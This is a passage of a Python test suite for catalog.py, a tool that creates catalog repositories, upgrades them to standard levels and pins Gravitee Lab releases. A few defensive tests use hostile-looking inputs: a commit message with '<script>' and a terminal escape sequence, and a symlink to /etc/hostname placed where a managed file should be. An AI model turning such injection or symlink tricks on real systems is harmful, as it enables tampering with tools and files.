        self.assertEqual((code, err), (0, ""))
        lines = (self.work / "hub" / "catalog.yml").read_text().splitlines()
        legacy = [line for line in lines if line.strip().split(":")[0] in ("schema", "lab")]
        self.assertEqual(legacy, [f"  schema: 1   {manifest.LEGACY_NOTE}", f"  lab: 1   {manifest.LEGACY_NOTE}"],
                         "Older Gravitee Labs need schema and read lab: the lines are there, and the author leaves them to "
                         "catalog.py")

    def test_a_given_commit_and_address_are_taken_as_they_are(self):
        code, out, err = self.new("--maintainers", "@a", "--lab-repo", "acme/other", "--lab-ref", NEWER_COMMIT, lab=self.work)
        self.assertEqual((code, err), (0, ""))
        found = json.loads((self.work / "hub" / ".github" / "standard.json").read_text())
        self.assertEqual(found["lab"], {"ref": NEWER_COMMIT, "repository": "acme/other"})

    def test_the_lab_address_cannot_be_read(self):
        code, out, err = self.new("--maintainers", "@a", lab=self.work)
        self.assertEqual((code, out, err), (2, "", "The Lab address could not be read. Give --lab-repo OWNER/REPO.\n"))
        self.assertFalse((self.work / "hub").exists())

    def test_a_folder_that_is_not_empty_is_refused_and_left_alone(self):
        (self.work / "hub").mkdir()
        (self.work / "hub" / "mine.txt").write_text("keep")
        code, out, err = self.new("--maintainers", "@a", "--lab-repo", "acme/lab", "--lab-ref", NEWER_COMMIT)
        self.assertEqual((code, out), (2, ""))
        self.assertTrue(err.endswith("is not empty. Choose a new folder.\n"), err)
        self.assertEqual(sorted(path.name for path in (self.work / "hub").iterdir()), ["mine.txt"])

    def test_an_empty_folder_is_fine(self):
        (self.work / "hub").mkdir()
        self.assertEqual(self.new("--maintainers", "@a", "--lab-repo", "acme/lab", "--lab-ref", NEWER_COMMIT)[0], 0)

    def test_a_parameter_that_is_wrong_ends_in_one_line_and_nothing_is_made(self):
        for more in (("--license", "Apache 2.0"), ("--images", "GHCR.io/x"), ("--with", "gold"), ("--platforms", "arm")):
            code, out, err = self.new("--maintainers", "@a", "--lab-repo", "acme/lab", "--lab-ref", NEWER_COMMIT, *more)
            self.assertEqual((code, out), (2, ""), more)
            self.assertEqual(len(err.splitlines()), 1, err)
            self.assertFalse((self.work / "hub").exists())

    def test_an_id_and_a_name_are_asked_for(self):
        out, err = io.StringIO(), io.StringIO()
        with contextlib.redirect_stdout(out), contextlib.redirect_stderr(err):
            self.assertEqual(standard.main_new([str(self.work / "x"), "--name", "X", "--maintainers", "@a", "--lab-repo", "a/b",
                                                "--lab-ref", NEWER_COMMIT]), 2)
            self.assertEqual(standard.main_new(["--id", "x"]), 2)
        self.assertIn("Missing: id.", err.getvalue())

    def test_local_makes_a_folder_catalog_with_no_lab_and_no_owner(self):
        code, out, err = self.new("--local", lab=self.work)
        self.assertEqual((code, err), (0, ""))
        self.assertTrue(out.startswith("Created Acme Hub in " + str(self.work / "hub") + " (a folder catalog, 7 files)\n"))
        self.assertEqual(sorted(path.name for path in (self.work / "hub").iterdir()), [".gitignore", "LICENSE", "Makefile", "README.md", "addons", "catalog.yml"])

class Upgrading(Case):
    """The plan and the writing."""

    def setUp(self):
        support.identity(self)

    def repo(self, files=None, **more):
        return support.Repo(self, files if files is not None else render(**more))

    def plan(self, repo, **options):
        return standard.upgrade_plan(FolderTree(repo.root), options)

    def actions(self, plan):
        return {each["path"]: each["action"] for each in plan["files"] if each["action"] != "current"}

    def upgrade(self, repo, *argv, lab=None):
        out, err = io.StringIO(), io.StringIO()
        with contextlib.redirect_stdout(out), contextlib.redirect_stderr(err):
            code = standard.main_upgrade([str(repo.root), *argv], lab=lab or repo.top)
        return code, out.getvalue(), err.getvalue()

    def upgrade_here(self, repo, *argv, lab=None):
        """`catalog.py upgrade . ...` run in the folder of the catalog, as the Makefile runs it."""
        out, err = io.StringIO(), io.StringIO()
        before = os.getcwd()
        os.chdir(str(repo.root))
        try:
            with contextlib.redirect_stdout(out), contextlib.redirect_stderr(err):
                code = standard.main_upgrade([".", *argv], lab=lab or repo.top)
        finally:
            os.chdir(before)
        return code, out.getvalue(), err.getvalue()

    def test_nothing_to_upgrade(self):
        repo = self.repo()
        plan = self.plan(repo)
        self.assertEqual((plan["pending"], plan["refused"], self.actions(plan), plan["owned"]), (False, "", {}, []))
        self.assertEqual(self.upgrade(repo), (0, "Acme Hub is on standard 9. This Lab has standard 9.\n\nNothing to upgrade\n", ""))

    def test_the_lines_older_labs_read_are_written_when_catalog_yml_lacks_them_and_made_true_when_they_are_wrong(self):
        """Older Gravitee Labs need `schema` and read `lab`: `upgrade --write` is the fix `check` names for them."""
        files = render()
        bare = b"".join(line for line in files["catalog.yml"].splitlines(True) if line.split(b":")[0].strip() not in (b"schema", b"lab"))
        repo = self.repo(files={**files, "catalog.yml": bare})
        self.patch(standard, "legacy_lab", lambda root: 1)
        code, out, _ = self.upgrade(repo, "--write")
        self.assertEqual(code, 0)
        note = b"   # For older Gravitee Labs: written by catalog.py"
        self.assertEqual((repo.root / "catalog.yml").read_bytes(),
                         bare.replace(b"x-gravitee-catalog:\n", b"x-gravitee-catalog:\n  schema: 1" + note + b"\n")
                         .replace(b"version: 0.1.0\n", b"version: 0.1.0\n  lab: 1" + note + b"\n"))
        self.assertIn("catalog.yml", out)
        repo.commit({"catalog.yml": (repo.root / "catalog.yml").read_bytes()})
        self.patch(standard, "legacy_lab", lambda root: 2)
        plan = self.plan(repo, legacy_lab=2)
        self.assertEqual(self.actions(plan), {"catalog.yml": "update"})
        self.assertIn(b"  lab: 2" + note, next(each["content"] for each in plan["files"] if each["path"] == "catalog.yml"))
        self.assertEqual(self.actions(self.plan(repo, legacy_lab=None)), {}, "what this Lab cannot say is left as the file has it")
        self.assertEqual(self.actions(self.plan(repo)), {}, "a fleet upgrade leaves catalog.yml to its owners")

    def test_a_lab_one_level_ahead_gives_a_plan_with_its_notes_and_only_the_files_the_level_changed(self):
        repo = self.repo(files=at(8))
        plan = self.plan(repo)
        self.assertEqual(self.actions(plan), {".github/workflows/ci.yml": "update", ".github/standard.json": "update"})
        self.assertEqual([each["level"] for each in plan["notes"]], [9])
        self.assertTrue(plan["pending"])
        self.assertEqual((plan["have"], plan["level"]), (8, 9))

    def test_a_catalog_of_level_one_gets_nightly_and_stays_without_publish_until_it_names_a_registry(self):
        repo = self.repo(files=at(1))
        plan = self.plan(repo)
        self.assertEqual(self.actions(plan), {".github/standard.json": "update", ".github/workflows/ci.yml": "update",
                                              ".github/workflows/nightly.yml": "add", ".github/rulesets/history.json": "add",
                                              ".github/rulesets/tag-history.json": "add"})
        self.assertEqual([each["level"] for each in plan["notes"]], [2, 3, 4, 5, 6, 7, 8, 9])
        written = standard.upgrade_apply(repo.root, plan)
        self.assertNotIn(".github/workflows/publish.yml", written)
        self.assertFalse((repo.root / ".github/workflows/publish.yml").exists())
        self.assertEqual(json.loads((repo.root / ".github/standard.json").read_text())["standard"], 9)
        self.assertEqual(standard.drift(FolderTree(repo.root)), [])
        self.assertFalse(self.plan(repo)["pending"])
        self.assertIn("schedule", (repo.root / ".github/workflows/nightly.yml").read_text())

    def test_a_catalog_of_level_one_that_names_a_registry_gets_publish_too(self):
        repo = self.repo(files=at(1, images="ghcr.io/acme/lab-hub"))
        plan = self.plan(repo)
        self.assertEqual(self.actions(plan), {".github/standard.json": "update", ".github/workflows/ci.yml": "update",
                                              ".github/workflows/nightly.yml": "add", ".github/workflows/publish.yml": "add",
                                              ".github/rulesets/history.json": "add", ".github/rulesets/tag-history.json": "add"})
        standard.upgrade_apply(repo.root, plan)
        self.assertEqual(standard.drift(FolderTree(repo.root)), [])
        self.assertNotIn(".github/workflows/e2e.yml", [each["path"] for each in plan["files"]])

    def test_a_catalog_of_level_three_that_sets_a_registry_later_is_asked_for_publish(self):
        repo = self.repo()
        self.assertFalse(self.plan(repo)["pending"])
        files = {**render(), "catalog.yml": render(images="ghcr.io/acme/lab-hub")["catalog.yml"]}
        repo = self.repo(files=files)
        self.assertEqual(self.actions(self.plan(repo)), {".github/workflows/publish.yml": "add"})
        self.assertEqual(where(standard.drift(tree_of(files)), "SD01"), [".github/workflows/publish.yml"])

    def test_the_plan_is_printed_as_section_7_4_shows_it(self):
        repo = self.repo(files=at(7))
        text = standard.describe(self.plan(repo))
        self.assertEqual(text.split("\n")[0], "Acme Hub is on standard 7. This Lab has standard 9.")
        self.assertIn("\nWhat is new in standard 8\n  The catalog's own runs on main", text)
        self.assertTrue(text.endswith("\nWill change\n  update   .github/standard.json\n  update   .github/workflows/ci.yml"), text)
        self.assertNotIn("Nothing to upgrade", text)

    def test_a_pending_plan_without_write_exits_1_and_says_nothing_was_written(self):
        repo = self.repo(files=edited(render(), ".github/workflows/ci.yml", lambda text: text + "# x\n"))
        code, out, err = self.upgrade(repo)
        self.assertEqual((code, err), (1, ""))
        self.assertIn("Will change\n  update   .github/workflows/ci.yml\n", out)
        self.assertTrue(out.endswith("Nothing was written. To apply: run it again with --write (make upgrade WRITE=1).\n"), out)
        self.assertIn("# x", (repo.root / ".github/workflows/ci.yml").read_text())

    def test_write_brings_the_files_to_the_level_and_a_second_run_has_nothing_to_do(self):
        repo = self.repo(files=at(8))
        plan = self.plan(repo)
        written = standard.upgrade_apply(repo.root, plan)
        self.assertEqual(written, [".github/standard.json", ".github/workflows/ci.yml"])
        self.assertEqual(standard.marker_level((repo.root / ".catalog/standard.mk").read_text(), ".catalog/standard.mk"), 8)   # no byte changed
        self.assertEqual(standard.marker_level((repo.root / ".github/workflows/ci.yml").read_text(), ".github/workflows/ci.yml"), 9)
        self.assertEqual(standard.drift(FolderTree(repo.root)), [])
        again = self.plan(repo)
        self.assertEqual((again["pending"], self.actions(again)), (False, {}))
        self.assertEqual(json.loads((repo.root / ".github/standard.json").read_text())["standard"], 9)
        self.assertEqual(self.plan(repo)["have"], 9)

    def test_the_write_command_says_how_many_files_and_exits_0(self):
        repo = self.repo(files=edited(render(), ".github/workflows/ci.yml", lambda text: text + "# x\n"))
        code, out, err = self.upgrade(repo, "--write")
        self.assertEqual((code, err), (0, ""))
        self.assertTrue(out.endswith("Wrote 1 files.\n"), out)
        self.assertEqual(standard.drift(FolderTree(repo.root)), [])

    def test_the_pins_a_catalog_holds_are_kept(self):
        def bump(text):
            return text.replace("3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1", "9" * 40 + " # v7.9.9")
        self.assertFalse(self.plan(self.repo(files=edited(render(), ".github/workflows/ci.yml", bump)))["pending"])   # a bump is not drift
        plan = self.plan(self.repo(files=edited(at(8), ".github/workflows/ci.yml", bump)))   # behind: rewritten, with the pins it holds
        ci = [each for each in plan["files"] if each["path"] == ".github/workflows/ci.yml"][0]
        self.assertIn(b"actions/checkout@" + b"9" * 40 + b" # v7.9.9", ci["content"])
        self.assertNotIn(b"3d3c42e5aac5ba805825da76410c181273ba90b1", ci["content"])
        self.assertIn(b"timeout-minutes: 15", ci["content"])

    def test_a_dirty_tree_is_refused_with_exit_2_and_nothing_is_written(self):
        repo = self.repo()
        (repo.root / ".github/workflows/ci.yml").write_text((repo.root / ".github/workflows/ci.yml").read_text() + "# mine\n")
        before = (repo.root / ".github/workflows/ci.yml").read_text()
        code, out, err = self.upgrade(repo, "--write")
        self.assertEqual((code, err), (2, "Uncommitted changes in files the upgrade rewrites: .github/workflows/ci.yml. Commit or restore them, "
                                          "then run again.\n"))
        self.assertEqual((repo.root / ".github/workflows/ci.yml").read_text(), before)

    def test_a_file_git_does_not_track_yet_is_not_overwritten_either(self):
        repo = support.Repo(self)                      # nothing is committed: every file is new to git
        support.write(repo.root, edited(render(), ".github/workflows/ci.yml", lambda text: text + "# mine\n"))
        path = repo.root / ".github/workflows/ci.yml"
        before = path.read_text()
        self.assertEqual(standard.dirty_files(repo.root, [".github/workflows/ci.yml", "Makefile", ".github/nothing.yml"]),
                         [".github/workflows/ci.yml", "Makefile"])            # only the paths that were asked about
        code, out, err = self.upgrade(repo, "--write")
        self.assertEqual(code, 2)
        self.assertIn("Uncommitted changes in files the upgrade rewrites: .github/workflows/ci.yml", err)
        self.assertEqual(path.read_text(), before)
        repo.git("add", "-A")
        repo.git("commit", "--quiet", "-m", "Create the catalog")
        self.assertEqual(self.upgrade(repo, "--write")[0], 0)                     # committed, it is the person's to take back
        self.assertNotIn("# mine", path.read_text())

    def test_a_file_git_ignores_is_not_overwritten_either(self):
        repo = self.repo()
        repo.git("rm", "--cached", "--quiet", ".github/workflows/ci.yml")
        (repo.root / ".gitignore").write_text(".github/workflows/ci.yml\n")
        repo.git("add", ".gitignore")
        repo.git("commit", "--quiet", "-m", "Ignore it")
        path = repo.root / ".github/workflows/ci.yml"
        path.write_text(path.read_text() + "# mine\n")
        self.assertEqual(standard.dirty_files(repo.root, [".github/workflows/ci.yml"]), [".github/workflows/ci.yml"])
        code, out, err = self.upgrade(repo, "--write")
        self.assertEqual(code, 2)
        self.assertIn("# mine", path.read_text())

    def test_a_clean_tracked_file_and_the_files_nobody_rewrites_are_not_in_the_way(self):
        repo = self.repo()
        (repo.root / "scratch.txt").write_text("not the standard's\n")                     # untracked, and not a path of the plan
        self.assertEqual(standard.dirty_files(repo.root, [".github/workflows/ci.yml", "Makefile"]), [])
        self.assertEqual(standard.dirty_files(repo.root, []), [])
        self.assertEqual(standard.dirty_files(repo.top, [".github/workflows/ci.yml"]), [])    # not a work tree

    def test_git_that_says_too_much_stops_the_upgrade_with_one_line(self):
        repo = self.repo(files=edited(render(), ".github/workflows/ci.yml", lambda text: text + "# x\n"))
        (repo.root / ".github/untracked.txt").write_text("x\n")
        with (repo.root / ".github/workflows/ci.yml").open("a") as handle:
            handle.write("# y\n")
        self.patch(standard, "GIT_LIMIT", 10)
        with self.assertRaisesRegex(standard.UpgradeError, "far more than the few files"):
            standard.dirty_files(repo.root, [".github"])
        code, out, err = self.upgrade(repo, "--write")
        self.assertEqual((code, len(err.splitlines())), (2, 1))
        self.assertIn("far more than the few files of the standard can account for", err)
        self.assertIn("# x", (repo.root / ".github/workflows/ci.yml").read_text())

    def test_a_byte_order_mark_does_not_hide_a_managed_file_and_the_upgrade_puts_it_right(self):
        repo = self.repo(files=edited(render(), ".github/workflows/ci.yml", lambda text: "\ufeff" + text))
        plan = self.plan(repo)
        self.assertEqual((self.actions(plan), plan["owned"]), ({".github/workflows/ci.yml": "update"}, []))
        standard.upgrade_apply(repo.root, plan)
        self.assertFalse((repo.root / ".github/workflows/ci.yml").read_bytes().startswith(b"\xef\xbb\xbf"))
        self.assertEqual(standard.drift(FolderTree(repo.root)), [])

    def test_adopt_adds_what_is_missing_keeps_what_is_there_and_lists_what_the_catalog_owns(self):
        files = {"catalog.yml": render()["catalog.yml"], "README.md": b"# mine\n", ".github/workflows/ci.yml": b"name: mine\n", "addons/x/compose.yml":
                 b"services: {}\n"}
        repo = self.repo(files=files)
        plan = self.plan(repo, adopt=True, maintainers="@acme/maintainers", lab_repository="acme/gravitee-lab", lab_ref=LAB_COMMIT)
        self.assertEqual(plan["refused"], "")
        self.assertEqual(plan["owned"], [".github/workflows/ci.yml"])
        added = {each["path"] for each in plan["files"] if each["action"] == "add"}
        self.assertIn(".github/standard.json", added)
        self.assertIn(".github/CODEOWNERS", added)
        self.assertIn("LICENSE", added)
        self.assertIn(".catalog/standard.mk", added)
        self.assertNotIn("README.md", added)
        self.assertNotIn("addons/hello/compose.yml", added)   # the sample is for a new catalog, never for an adopted one
        self.assertNotIn("catalog.yml", added)
        standard.upgrade_apply(repo.root, plan)
        self.assertEqual((repo.root / "README.md").read_bytes(), b"# mine\n")
        self.assertEqual((repo.root / ".github/workflows/ci.yml").read_bytes(), b"name: mine\n")
        self.assertEqual((repo.root / "addons/x/compose.yml").read_bytes(), b"services: {}\n")
        found = standard.drift(FolderTree(repo.root))
        self.assertEqual(sorted(each.code for each in found), ["SD08"])   # the workflow it kept is the catalog's: no marker, no comparison

    def test_adopt_needs_the_owners_to_write_codeowners(self):
        repo = self.repo(files={"catalog.yml": render()["catalog.yml"]})
        plan = self.plan(repo, adopt=True, lab_repository="acme/lab", lab_ref=LAB_COMMIT)
        self.assertIn("--maintainers is required to add .github/CODEOWNERS", plan["refused"])
        self.assertEqual(plan["files"], [])

    def test_adopt_reads_the_owners_from_the_star_line_when_there_is_one(self):
        files = {"catalog.yml": render()["catalog.yml"], ".github/CODEOWNERS": b"* @acme/maintainers @alice\n/.github/ @acme/maintainers\n"}
        repo = self.repo(files=files)
        plan = self.plan(repo, adopt=True, lab_repository="acme/lab", lab_ref=LAB_COMMIT)
        self.assertEqual(plan["refused"], "")
        security = [each for each in plan["files"] if each["path"] == "SECURITY.md"][0]
        self.assertIn(b"@acme/maintainers", security["content"])

    def test_without_adopt_a_repository_with_no_standard_json_is_refused_with_the_way_out(self):
        repo = self.repo(files={"catalog.yml": render()["catalog.yml"]})
        plan = self.plan(repo)
        self.assertIn("Fix: catalog.py upgrade --adopt.", plan["refused"])
        code, out, err = self.upgrade(repo)
        self.assertEqual((code, out), (2, ""))
        self.assertIn("--adopt", err)

    def test_an_unusable_standard_json_is_refused_and_never_overwritten(self):
        for raw in (b"{", b'{"standard": 0}'):
            repo = self.repo(files={**render(), ".github/standard.json": raw})
            plan = self.plan(repo)
            self.assertIn(".github/standard.json is not usable", plan["refused"])
            self.assertTrue(self.plan(repo, adopt=True)["refused"].startswith(".github/standard.json is not usable"))
            self.assertEqual((repo.root / ".github/standard.json").read_bytes(), raw)

    def test_a_repository_above_the_labs_level_is_refused(self):
        files = render()
        files[".github/standard.json"] = files[".github/standard.json"].replace(b'"standard": 9', b'"standard": 10')
        plan = standard.upgrade_plan(tree_of(files), {})
        self.assertEqual(plan["refused"], ".github/standard.json says standard 10; this Lab knows 9. Fix: update the Lab with git pull, then "
                                          "run again.")

    def test_a_catalog_that_is_not_one_is_refused(self):
        plan = standard.upgrade_plan(tree_of({"README.md": b"x"}), {})
        self.assertEqual(plan["refused"], "catalog.yml is missing: this folder is not a catalog.")

    def test_exec_bits_and_line_ends_are_kept_and_written_as_lf(self):
        repo = self.repo(files=at(1))
        ci = repo.root / ".github/workflows/ci.yml"
        ci.write_bytes(ci.read_bytes().replace(b"\n", b"\r\n") + b"# one more\r\n")
        ci.chmod(0o755)
        repo.git("add", "-A")
        repo.git("commit", "--quiet", "-m", "Mine")
        written = standard.upgrade_apply(repo.root, self.plan(repo))
        self.assertIn(".github/workflows/ci.yml", written)
        self.assertTrue(support.executable(ci))                                         # a file that was executable still is
        self.assertFalse(support.executable(repo.root / ".github/workflows/nightly.yml"))   # a new one is not
        self.assertFalse(support.executable(repo.root / ".github/standard.json"))
        self.assertNotIn(b"\r", ci.read_bytes())
        self.assertNotIn(b"# one more", ci.read_bytes())
        self.assertEqual(standard.drift(FolderTree(repo.root)), [])

    def test_nothing_is_written_through_a_link(self):
        repo = self.repo(files=at(1))
        outside = repo.top / "outside"
        outside.mkdir()
        (repo.root / ".github/workflows").rename(repo.top / "moved")
        os.symlink(outside, repo.root / ".github/workflows")
        plan = standard.upgrade_plan(tree_of(at(1)), {})
        with self.assertRaisesRegex(standard.UpgradeError, "is a link or a file, not a folder"):
            standard.upgrade_apply(repo.root, plan)
        self.assertEqual(list(outside.iterdir()), [])

    def test_a_link_in_the_place_of_a_managed_file_is_replaced_by_the_file(self):
        repo = self.repo()
        target = repo.root / ".github/dependabot.yml"
        target.unlink()
        os.symlink("/etc/hostname", target)
        plan = self.plan(repo)
        self.assertEqual(self.actions(plan), {".github/dependabot.yml": "update"})
        standard.upgrade_apply(repo.root, plan)
        self.assertFalse(target.is_symlink())
        self.assertEqual(standard.drift(FolderTree(repo.root)), [])

    def test_the_e2e_module_is_added_on_request(self):
        repo = self.repo(images="ghcr.io/acme/lab-hub")
        self.assertNotIn(".github/workflows/e2e.yml", self.actions(self.plan(repo)))
        self.assertEqual(self.actions(self.plan(repo, **{"with": ["e2e"]})),
                         {".github/workflows/e2e.yml": "add", ".github/workflows/versions.yml": "add"})

    def test_a_file_the_standard_adds_to_a_module_the_catalog_has_comes_without_asking(self):
        # A catalog of standard 6 with its end-to-end run gets versions.yml at 7; one without the module does not
        self.assertEqual(self.actions(self.plan(self.repo(files=at(6)))).get(".github/workflows/versions.yml"), "add")
        repo = self.repo(files={path: data for path, data in at(6).items() if path != ".github/workflows/e2e.yml"})
        self.assertNotIn(".github/workflows/versions.yml", self.actions(self.plan(repo)))

    def test_adopt_from_the_command_line_takes_the_labs_address_and_commit_from_the_lab_checkout(self):
        lab = support.lab_checkout(self)
        repo = self.repo(files={"catalog.yml": render()["catalog.yml"], "README.md": b"# mine\n"})
        code, out, err = self.upgrade(repo, "--adopt", "--maintainers", "@acme/maintainers", "--write", lab=lab.root)
        self.assertEqual((code, err), (0, ""))
        found = json.loads((repo.root / ".github/standard.json").read_text())
        self.assertEqual(found["lab"], {"ref": lab.git("rev-parse", "HEAD").strip(), "repository": "acme/gravitee-lab"})
        self.assertEqual((repo.root / "README.md").read_bytes(), b"# mine\n")
        self.assertEqual(standard.drift(FolderTree(repo.root)), [])

    def test_a_bad_lab_ref_is_refused(self):
        repo = self.repo()
        for ref in ("main", "v1", LAB_COMMIT[:39], "latest!"):
            plan = self.plan(repo, lab_ref=ref)
            self.assertEqual(plan["refused"], "--lab-ref takes the full commit of the Lab: 40 hexadecimal characters.", ref)


class MovingThePin(Case):
    """`--lab-ref` prints the compare link and the Lab's own log, and refuses a commit that is not a release of the Lab (a tag
    vX.Y.Z on its main). `latest` is the latest release, not the tip of main."""

    def setUp(self):
        support.identity(self)
        self.lab = support.Repo(self, {"lab-ui/catalog.py": b"print(0)\n", ".github/x.yml": b"x\n", "docs/a.md": b"a\n",
                                       standard.MANIFEST_IN_LAB: support.release_manifest()}, name="lab")
        self.old = self.lab.git("rev-parse", "HEAD").strip()
        self.lab.git("tag", "v1.4.0", self.old)
        for number in range(120):
            where_ = "lab-ui/catalog.py" if number % 3 else ("docs/a.md" if number % 2 else ".github/x.yml")
            self.lab.commit({where_: f"v{number}\n".encode()}, f"Change {number} <script>\x1b[31m" if number == 7 else f"Change {number}")
        self.new = self.lab.git("rev-parse", "HEAD").strip()
        self.lab.git("tag", "v1.10.0", self.new)   # the latest release: 1.10 is above 1.9, which is a name and not a number
        self.lab.git("tag", "v1.9.0", self.old)
        self.lab.git("tag", "nightly", self.new)
        self.lab.git("push", "--quiet", "origin", "main")
        self.lab.git("fetch", "--quiet", "origin")
        self.catalog = support.Repo(self, render(lab_ref=self.old, lab_repository="acme/gravitee-lab"), name="hub")

    def plan(self, **options):
        return standard.upgrade_plan(FolderTree(self.catalog.root), {"lab_ref": self.new, "lab": self.lab.root, **options})

    def test_the_plan_has_the_compare_link_and_at_most_fifty_lines_of_the_labs_log(self):
        plan = self.plan()
        self.assertEqual(plan["lab"]["compare"], f"https://github.com/acme/gravitee-lab/compare/{self.old}...{self.new}")
        self.assertEqual((plan["lab"]["old"], plan["lab"]["new"]), (self.old, self.new))
        self.assertLessEqual(len(plan["lab"]["log"]), 50)
        self.assertGreater(len(plan["lab"]["log"]), 30)
        self.assertTrue(all(len(line) <= 200 and "\x1b" not in line for line in plan["lab"]["log"]))
        self.assertEqual(self.actions(plan), {".github/standard.json": "update"})
        text = standard.describe(plan)
        self.assertIn(f"The Lab pin moves from {self.old[:7]} to {self.new[:7]}. What it brings:", text)
        self.assertIn(plan["lab"]["compare"], text)
        self.assertEqual(len([line for line in text.split("\n") if line.startswith("  ") and "Change " in line]), len(plan["lab"]["log"]))

    def actions(self, plan):
        return {each["path"]: each["action"] for each in plan["files"] if each["action"] != "current"}

    def test_the_pin_moves_in_standard_json_and_nothing_else_of_it_changes(self):
        before = json.loads((self.catalog.root / ".github/standard.json").read_text())
        standard.upgrade_apply(self.catalog.root, self.plan())
        after = json.loads((self.catalog.root / ".github/standard.json").read_text())
        self.assertEqual(after, {**before, "lab": {**before["lab"], "ref": self.new}})

    def test_a_commit_that_is_not_on_the_labs_main_is_refused_before_anything_is_written(self):
        self.lab.git("switch", "--quiet", "-c", "side")
        side = self.lab.commit({"lab-ui/catalog.py": b"print('x')\n"}, "Only on a branch")
        self.lab.git("tag", "v9.9.9", side)   # a tag of a branch is no release of the Lab
        before = (self.catalog.root / ".github/standard.json").read_bytes()
        plan = self.plan(lab_ref=side)
        self.assertEqual(plan["refused"], f"The Lab commit {side[:7]} is not a release of the Lab. Fix: pin the latest release "
                                          "(catalog.py upgrade --lab-ref latest).")
        with self.assertRaises(standard.UpgradeError):
            standard.upgrade_apply(self.catalog.root, plan)
        self.assertEqual((self.catalog.root / ".github/standard.json").read_bytes(), before)

    def test_a_commit_of_main_that_no_release_names_is_refused(self):
        between = self.lab.git("rev-parse", "HEAD~5").strip()
        self.assertEqual(standard.release_state(self.lab.root, between), "no")
        self.assertIn("is not a release of the Lab", self.plan(lab_ref=between)["refused"])
        self.assertEqual((standard.release_state(self.lab.root, self.new), standard.release_state(self.lab.root, self.old)),
                         ("yes", "yes"))

    def test_a_commit_the_lab_checkout_does_not_have_is_refused_too(self):
        plan = self.plan(lab_ref="e" * 40)
        self.assertIn("is not a release of the Lab", plan["refused"])
        self.assertEqual(standard.release_state(self.lab.root, "e" * 40),
                         "the Lab checkout does not hold eeeeeee: update it with git pull, then run again")

    def test_the_command_takes_latest_as_the_commit_of_the_latest_release(self):
        self.lab.commit({"lab-ui/catalog.py": b"print('next')\n"}, "Merged and not released yet")
        self.lab.git("push", "--quiet", "origin", "main")
        self.lab.git("fetch", "--quiet", "origin")
        self.assertEqual(standard.latest_release(self.lab.root), self.new, "the greatest tag vX.Y.Z on main, not its tip")
        out, err = io.StringIO(), io.StringIO()
        with contextlib.redirect_stdout(out), contextlib.redirect_stderr(err):
            code = standard.main_upgrade([str(self.catalog.root), "--lab-ref", "latest", "--write"], lab=self.lab.root)
        self.assertEqual((code, err.getvalue()), (0, ""))
        self.assertEqual(json.loads((self.catalog.root / ".github/standard.json").read_text())["lab"]["ref"], self.new)
        self.assertIn("compare/", out.getvalue())

    def test_a_release_that_does_not_ship_the_standard_written_is_no_pin(self):
        """The workflows of a standard call what the Lab of that standard has: the release pinned must ship it. When none does
        yet, the Lab is released first."""
        older = support.Repo(self, {"lab-ui/catalog.py": b"print(0)\n", standard.MANIFEST_IN_LAB: support.release_manifest(4)},
                             name="older-lab")
        release = older.git("rev-parse", "HEAD").strip()
        older.git("tag", "v1.4.0", release)
        self.assertEqual((standard.release_level(older.root, release), standard.release_level(older.root, "e" * 40)), (4, None))
        out, err = io.StringIO(), io.StringIO()
        with contextlib.redirect_stdout(out), contextlib.redirect_stderr(err):
            code = standard.main_upgrade([str(self.catalog.root), "--lab-ref", "latest", "--write"], lab=older.root)
        self.assertEqual((code, err.getvalue()), (2, f"Standard {standard.LEVEL} is not in a released Gravitee Lab yet. Fix: release "
                                                     "the Lab first, then run this again.\n"))
        self.assertEqual(json.loads((self.catalog.root / ".github/standard.json").read_text())["lab"]["ref"], self.old)
        # a pin of a release before the standard, when a newer release has it: the latest is the fix
        self.lab.commit({standard.MANIFEST_IN_LAB: support.release_manifest(4)}, "An older standard")
        behind = self.lab.git("rev-parse", "HEAD").strip()
        self.lab.git("tag", "v1.11.0", behind)
        self.lab.commit({standard.MANIFEST_IN_LAB: support.release_manifest()}, "This standard")
        ahead = self.lab.git("rev-parse", "HEAD").strip()
        self.lab.git("tag", "v1.12.0", ahead)
        self.lab.git("push", "--quiet", "origin", "main")
        self.lab.git("fetch", "--quiet", "origin")
        self.assertEqual(self.plan(lab_ref=behind)["refused"],
                         f"The Lab release {behind[:7]} has standard 4; this writes standard {standard.LEVEL}. Fix: pin the latest "
                         "release (catalog.py upgrade --lab-ref latest).")
        self.assertEqual(self.plan(lab_ref=ahead)["refused"], "")

    def test_latest_without_a_release_says_how_to_get_one(self):
        bare = support.Repo(self, {"lab-ui/catalog.py": b"print(0)\n"}, name="untagged")
        self.assertEqual(standard.latest_release(bare.root), "")
        out, err = io.StringIO(), io.StringIO()
        with contextlib.redirect_stdout(out), contextlib.redirect_stderr(err):
            code = standard.main_upgrade([str(self.catalog.root), "--lab-ref", "latest"], lab=bare.root)
        self.assertEqual((code, err.getvalue()), (2, "--lab-ref latest: the Lab checkout that runs this has no release to name. Fix: "
                                                     "git fetch --tags, then run again.\n"))

    def test_the_fleet_gets_a_plan_without_a_lab_checkout_and_no_log(self):
        plan = standard.upgrade_plan(FolderTree(self.catalog.root), {"lab_ref": self.new})
        self.assertEqual((plan["lab"]["log"], plan["refused"]), ([], ""))
        self.assertTrue(plan["lab"]["compare"])
        self.assertEqual(plan["owned"], [])


class DayOne(Case):
    """The template works on day one, as a contributor would meet it, offline."""

    def setUp(self):
        support.identity(self)
        self.repo = support.Repo(self, render())

    def test_check_finds_nothing_in_the_files_the_rules_read(self):
        result = audit.run(self.repo.root, audit.Options(seeder_paths=("seeder",)))
        self.assertEqual([(each.code, each.path, each.message) for each in result.problems], [])
        self.assertEqual(result.skipped, [])
        self.assertEqual(audit.status(result), 0)

    def test_check_finds_nothing_on_the_folder_catalog_either(self):
        folder = self.repo.top / "mine"
        support.write(folder, standard.render_new({"local": True, "id": "mine", "name": "Mine"}))
        result = audit.run(folder, audit.Options(seeder_paths=("seeder",)))
        self.assertEqual([(each.code, each.path) for each in result.problems], [])

    def test_the_audit_sees_the_edit_of_a_managed_file(self):
        path = self.repo.root / ".github/workflows/ci.yml"
        path.write_text(path.read_text().replace("timeout-minutes: 15", "timeout-minutes: 99", 1))
        result = audit.run(self.repo.root, audit.Options(families=("SD",)))
        self.assertEqual([(each.code, each.path) for each in result.problems], [("SD02", ".github/workflows/ci.yml")])
        self.repo.git("add", "-A")
        self.repo.git("commit", "--quiet", "-m", "Edit it")
        self.assertEqual([each.code for each in audit.run(self.repo.root, audit.Options(families=("SD",))).problems], ["SD02"])

    def test_make_resolves_every_target(self):
